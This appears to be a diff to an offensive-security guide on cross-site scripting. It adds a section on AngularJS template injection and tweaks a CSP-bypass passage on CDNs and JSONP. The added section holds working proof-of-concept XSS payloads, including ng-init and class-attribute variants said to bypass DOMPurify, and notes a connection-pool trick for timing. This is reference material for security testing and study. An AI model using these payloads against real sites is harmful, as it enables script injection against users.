@@ -400,8 +400,52 @@ When placing common XSS payloads in the triggers above, it becomes clear that th
 <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>Table of XSS payloads and DOM sinks that trigger them (<mark style="color:yellow;">yellow</mark> = Chrome but not Firefox)</p></figcaption></figure>
 
 {% file src="../.gitbook/assets/domxss-trigger-table.html" %}
-**Source code** for script used to generate and test the results in the table above
+**Source code** for script used to generate and **test** the results in the table above
 {% endfile %}
+
+### AngularJS Template Injection
+
+[AngularJS](https://angularjs.org/) is a common web framework for the frontend. It allows easy interactivity by adding special attributes and syntax that it recognizes and executes. This also exposes some new ways for HTML/Text injections to execute arbitrary JavaScript if regular ways are blocked. One caveat is that all these injections need to happen inside an element with an `ng-app` attribute to enable this feature.&#x20;
+
+When this is enabled, however, many possibilities open up. One of the most interesting is template injection using `{{` characters inside a text string, no HTML tags are needed here! This is a rather well-known technique though, so it may be blocked. In cases of HTML injection with strong filters, you may be able to add custom attributes bypassing filters like [DOMPurify](https://github.com/cure53/DOMPurify). See [this presentation by Masato Kinugawa](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=33) for some AngularJS tricks that managed to bypass Teams' filters.&#x20;
+
+Here are a few examples of how it can be abused on the latest version. All alerts fire on load:
+
+<pre class="language-html" data-title="Working Demo"><code class="lang-html">&#x3C;script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js">&#x3C;/script>
+
+&#x3C;body ng-app>
+<strong>  &#x3C;!-- Text injection -->
+</strong>  {{constructor.constructor('alert(1)')()}}
+<strong>  &#x3C;!-- Attribute injection -->
+</strong>  &#x3C;ANY ng-init="constructor.constructor('alert(2)')()">&#x3C;/ANY>
+<strong>  &#x3C;!-- Filter bypass (even DOMPurify!) -->
+</strong>  &#x3C;ANY data-ng-init="constructor.constructor('alert(3)')()">&#x3C;/ANY>
+  &#x3C;ANY class="ng-init:constructor.constructor('alert(4)')()">&#x3C;/ANY>
+  &#x3C;ANY class="AAA;ng-init:constructor.constructor('alert(5)')()">&#x3C;/ANY>
+  &#x3C;ANY class="AAA!ng-init:constructor.constructor('alert(6)')()">&#x3C;/ANY>
+  &#x3C;ANY class="AAA♩♬♪ng-init:constructor.constructor('alert(7)')()">&#x3C;/ANY>
+<strong>  &#x3C;!-- Dynamic content insertion also vulnerable -->
+</strong>  &#x3C;script>
+    document.body.innerHTML += `&#x3C;ANY ng-init="constructor.constructor('alert(8)')()">&#x3C;/ANY>`;
+  &#x3C;/script>
+&#x3C;/body>
+<strong>&#x3C;!-- Everything also works under `data-ng-app`, bypassing DOMPurify! -->
+</strong>&#x3C;div data-ng-app>
+  ...
+  &#x3C;b data-ng-init="constructor.constructor('alert(9)')()">&#x3C;/b>
+&#x3C;/div>
+</code></pre>
+
+{% hint style="warning" %}
+**Warning**: In some older versions of AngularJS, there was a sandbox preventing some of these arbitrary code executions. Every version has been bypassed, however, leading to how it is now without any sandbox. See the following page for a history of these older sandboxes:\
+[https://portswigger.net/research/dom-based-angularjs-sandbox-escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes)
+{% endhint %}
+
+{% hint style="info" %}
+**Tip**: Injecting content with `.innerHTML` does not always work, because it is only triggered _when AngularJS loads_. If you inject content later from a fetch, for example, it would not trigger even if a parent contains `ng-app`.&#x20;
+
+You may still be able to exploit this though, by slowing down the AngularJS script loading by **filling up the browser's connection pool**. [See this challenge writeup for details](https://blog.ryotak.net/post/dom-based-race-condition/).
+{% endhint %}
 
 ## Exploitation
 
@@ -685,7 +729,7 @@ Finally, we receive DNS requests on the `interactsh-client` that we can [decode]
 ```
 {% endcode %}
 
-#### CDNs in `script-src` (Angular Bypass)
+#### CDNs in `script-src` (AngularJS Bypass + JSONP)
 
 Every origin in this directive is trusted with all URLs it hosts. A common addition here is CDN (Content Delivery Network) domains that host many different JavaScript files for libraries. While in very unrestricted situations a CDN like [unpkg.com](https://www.unpkg.com/) will host **every file on NPM**, even malicious ones, others are less obvious.&#x20;
 
@@ -705,7 +749,11 @@ The [cdnjs.cloudflare.com](https://cdnjs.cloudflare.com) or [ajax.googleapis.com
 </strong><strong>&#x3C;div ng-app ng-csp>{{$on.curry.call().alert($on.curry.call().document.domain)}}&#x3C;/div>
 </strong></code></pre>
 
-Loading any of these blocks in a CSP that allows it, will trigger the `alert(document.domain)` function. A common pattern for finding these bypasses is using Angular to create an environment where code can be executed from **event handlers**, and then another library or callback function to **click** on the element, triggering the handler with your malicious code. See [jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a not-so-updated list of public JSONP endpoints you may find useful.&#x20;
+Loading any of these blocks in a CSP that allows it, will trigger the `alert(document.domain)` function. A common pattern for finding these bypasses is using Angular to create an environment where code can be executed from **event handlers**, and then another library or callback function to **click** on the element, triggering the handler with your malicious code.&#x20;
+
+See [jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) for a not-so-updated list of public JSONP endpoints you may find useful.&#x20;
+
+See [#angularjs-template-injection](cross-site-scripting-xss.md#angularjs-template-injection "mention") for more complex AngularJS injections that bypass filters.
 
 ### Filter Bypasses
 
